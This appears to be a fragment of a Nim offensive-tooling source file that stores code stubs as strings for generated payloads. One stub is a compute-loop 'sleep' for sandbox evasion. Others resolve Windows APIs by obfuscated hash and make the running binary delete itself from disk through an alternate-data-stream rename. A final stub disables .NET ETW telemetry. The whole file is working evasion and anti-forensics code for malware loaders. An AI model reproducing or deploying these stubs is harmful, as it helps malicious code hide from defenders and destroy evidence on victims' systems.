template split(orig: Node, value: int32, lower, equal, greater: var Node) =
  var equalGreater: Node
  splitBinary(orig, lower, equalGreater, value)
  splitBinary(equalGreater, equal, greater, value + 1)

type Tree = object
  root: Node

template hasValue(self: var Tree, x: int32): bool =
  var lower, equal, greater: Node
  split(self.root, x, lower, equal, greater)
  let ret = not equal.isNil
  merge(lower, equal, greater, self.root)
  ret

template insert(self: var Tree, x: int32) =
  var lower, equal, greater: Node
  split(self.root, x, lower, equal, greater)
  if equal.isNil:
    equal = newNode(x)
  merge(lower, equal, greater, self.root)

template erase(self: var Tree, x: int32) =
  var lower, equal, greater: Node
  split(self.root, x, lower, equal, greater)
  merge(lower, greater, self.root)

proc Calc * () =
  randomize()
  var
    tree = Tree()
    cur = 5'i32
    res = 0'i32
#2500000 = 12-14sec
  for i in 1'i64 ..< 500000'i64:
    #echo i
    let a = i mod 3
    cur = (cur * 57 + 43) mod 10007
    case a:
    of 0:
      tree.insert(cur)
    of 1:
      tree.erase(cur)
    of 2:
      if tree.hasValue(cur):
        res += 1
    else:
      discard

  #echo res

proc HowMuchTimeWouldYoulikeToSleep * (sec : int) = 
  var interval = 0
  let t0 = getTime()
  Calc()
  #echo "First run Done"
  var delta = getTime() - t0
  while delta.inSeconds() < sec:
      interval += 1
      #echo "Round: ",interval
      #echo delta.inSeconds()," Seconds out of: " , sec
      Calc()
      delta = getTime() - t0
  #echo delta.inSeconds()," Seconds"
"""

let DInvokeSelfDeleteStubs * = """

const
  SHLWAPI_DLL* = obf("shlwapi.dll")


type
  CreateFileW_t* = proc (lpFileName: LPCWSTR, dwDesiredAccess: DWORD, dwShareMode: DWORD, lpSecurityAttributes: LPSECURITY_ATTRIBUTES, dwCreationDisposition: DWORD, dwFlagsAndAttributes: DWORD, hTemplateFile: HANDLE): HANDLE {.stdcall.}
  SetFileInformationByHandle_t* = proc (hFile: HANDLE, FileInformationClass: FILE_INFO_BY_HANDLE_CLASS, lpFileInformation: LPVOID, dwBufferSize: DWORD): WINBOOL {.stdcall.}
  GetModuleFileNameW_t* = proc (hModule: HMODULE, lpFilename: LPWSTR, nSize: DWORD): DWORD {.stdcall.}
  PathFileExistsW_t* = proc (pszPath: LPCWSTR): WINBOOL {.stdcall.}

const
  CreateFileW_HASH * = obf("CreateFileW")
  SetFileInformationByHandle_HASH * = obf("SetFileInformationByHandle")
  GetModuleFileNameW_HASH * = obf("GetModuleFileNameW")
  PathFileExistsW_HASH * = obf("PathFileExistsW")

var MyCreateFileW*: CreateFileW_t
var MySetFileInformationByHandle*: SetFileInformationByHandle_t
var MyGetModuleFileNameW*: GetModuleFileNameW_t
var MyPathFileExistsW*: PathFileExistsW_t


# temporary workaround, as the ordinal changes between OS Versions and the relative address via DInvoke is wrong.

var ModuleFileName2: UNICODE_STRING
when defined(DInvoke):
    MyRtlInitUnicodeString(ModuleFileName2, obf("shlwapi.dll"))
else:
    RtlInitUnicodeString(ModuleFileName2, obf("shlwapi.dll"))
var shlwapi: HANDLE
when defined(DInvoke):
    var shlstatus = MyLdrLoadDll(nil, 0, &ModuleFileName2, &shlwapi)
else:
    var shlstatus = LdrLoadDll(nil, 0, &ModuleFileName2, &shlwapi)

if not NT_SUCCESS(shlstatus):
    when defined(verbose):
        echo obf("[X] Failed to load: shlwapi.dll")
else:
    when defined(verbose):
        echo obf("[+] Loaded: shlwapi.dll")

if (shlwapi == 0):
    when defined(verbose):
        echo obf("[X] Failed to load shlwapi.dll")

var pathfileExistsAddress = MyGetProcAddress(shlwapi,obf("PathFileExistsW"))
if isNil(pathfileExistsAddress):
    when defined(verbose):
        echo obf("[X] Failed to get the address of 'PathFileExistsW'")


MyCreateFileW = cast[CreateFileW_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), CreateFileW_HASH, 0, FALSE)))

MySetFileInformationByHandle = cast[SetFileInformationByHandle_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), SetFileInformationByHandle_HASH, 0, FALSE)))

MyGetModuleFileNameW = cast[GetModuleFileNameW_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetModuleFileNameW_HASH, 0, FALSE))


# Works but potentially the ordinal could change later on - this lead to bugs
#MyPathFileExistsW = cast[PathFileExistsW_t](get_function_address(cast[HMODULE](get_library_address(SHLWAPI_DLL, TRUE)), "", 669, FALSE))
# Doesn't work, as the relative address is not correct. All those Ordinal functions are ignored maybe? Have to troubleshoot
#MyPathFileExistsW = cast[PathFileExistsW_t](get_function_address(cast[HMODULE](get_library_address(SHLWAPI_DLL, TRUE)), PathFileExistsW_HASH, 0, FALSE))
MyPathFileExistsW = cast[PathFileExistsW_t](pathfileExistsAddress)
"""

let FileDeleteStub * = """

    #[
        Author: Marcello Salvati, Twitter: @byt3bl33d3r, slight modifications by @ShitSecure
        License: BSD 3-Clause
        Credit to @jonasLyk for the discovery of this method and LloydLabs for the initial C PoC code.
        References:
            - https://github.com/LloydLabs/delete-self-poc
            - https://twitter.com/jonasLyk/status/1350401461985955840
    ]# 


    proc PathFileExistsW(pszPath: LPCWSTR): WINBOOL {.winapi, stdcall, dynlib: "shlwapi", importc.}

    var DS_STREAM_RENAME = newWideCString(obf(":thiswontexist"))

    proc ds_open_handle(pwPath: PWCHAR): HANDLE =
        when defined(DInvoke): 
            return MyCreateFileW(pwPath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0)
        else:
            return CreateFileW(pwPath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0)

    proc ds_rename_handle(hHandle: HANDLE): WINBOOL =
        var fRename: FILE_RENAME_INFO
        RtlSecureZeroMemory(addr fRename, sizeof(fRename))

        var lpwStream: LPWSTR = cast[LPWSTR](DS_STREAM_RENAME)
        fRename.FileNameLength = sizeof(lpwStream).DWORD
        RtlCopyMemory(addr fRename.FileName, lpwStream, sizeof(lpwStream))

        when defined(DInvoke):
            return MySetFileInformationByHandle(hHandle, fileRenameInfo, addr fRename, sizeof(fRename) + sizeof(lpwStream))
        else:
            return SetFileInformationByHandle(hHandle, fileRenameInfo, addr fRename, sizeof(fRename) + sizeof(lpwStream))

    proc ds_deposite_handle(hHandle: HANDLE): WINBOOL =
        var fDelete: FILE_DISPOSITION_INFO
        RtlSecureZeroMemory(addr fDelete, sizeof(fDelete))

        fDelete.DeleteFile = TRUE

        when defined(DInvoke):
            return MySetFileInformationByHandle(hHandle, fileDispositionInfo, addr fDelete, sizeof(fDelete).cint)
        else:
            return SetFileInformationByHandle(hHandle, fileDispositionInfo, addr fDelete, sizeof(fDelete).cint)


    var
        wcPath: array[MAX_PATH + 1, WCHAR]
        hCurrent: HANDLE

    RtlSecureZeroMemory(addr wcPath[0], sizeof(wcPath))

    when defined(DInvoke):
        if MyGetModuleFileNameW(0, addr wcPath[0], MAX_PATH) == 0:
            when defined(verbose):
                echo obf("[-] Failed to get the current module handle")
            quit(QuitFailure)
    else:
        if GetModuleFileNameW(0, addr wcPath[0], MAX_PATH) == 0:
            when defined(verbose):
                echo obf("[-] Failed to get the current module handle")
            quit(QuitFailure)

    hCurrent = ds_open_handle(addr wcPath[0])
    if hCurrent == INVALID_HANDLE_VALUE:
        when defined(verbose):
            echo obf("[-] Failed to acquire handle to current running process")
        quit(QuitFailure)

    when defined(verbose):
        echo obf("[*] Attempting to rename file name")
    if not ds_rename_handle(hCurrent).bool:
        when defined(verbose):
            echo obf("[-] Failed to rename to stream")
        quit(QuitFailure)

    when defined(verbose):
        echo obf("[*] Successfully renamed file primary :$DATA ADS to specified stream, closing initial handle")
    when defined(DInvoke):
        discard MyCloseHandle(hCurrent)
    else:
        discard CloseHandle(hCurrent)

    hCurrent = ds_open_handle(addr wcPath[0])
    if hCurrent == INVALID_HANDLE_VALUE:
        when defined(verbose):
            echo obf("[-] Failed to reopen current module")
        quit(QuitFailure)

    if not ds_deposite_handle(hCurrent).bool:
        when defined(verbose):
            echo obf("[-] Failed to set delete deposition")
        quit(QuitFailure)

    when defined(verbose):
        echo obf("[*] Closing handle to trigger deletion deposition")
    when defined(DInvoke):
        discard MyCloseHandle(hCurrent)
    else:
        discard CloseHandle(hCurrent)

    when defined(DInvoke):
        if not MyPathFileExistsW(addr wcPath[0]).bool:
            when defined(verbose):
                echo obf("[*] File deleted successfully")
    else:
        if not PathFileExistsW(addr wcPath[0]).bool:
            when defined(verbose):
                echo obf("[*] File deleted successfully")

"""



let ETWCOMVARStub * = """

    # ToDO: Change via Syscall -> ntdll.dll RtlSetEnvironmentVariable
    proc BlockETW(): bool =
        # Disable ETW via https://blog.xpnsec.com/hiding-your-dotnet-complus-etwenabled/
        var cometw: string = obf("COMPlus_ETWEnabled")
        var setnull: string = "0"
        putenv(cometw, setnull)
        return true

    success = BlockETW()
    when defined(verbose):
        echo obf("[*] ETW blocked by COMPLUS_ETWEnabled variable: ") & fmt"{bool(success)}"
"""
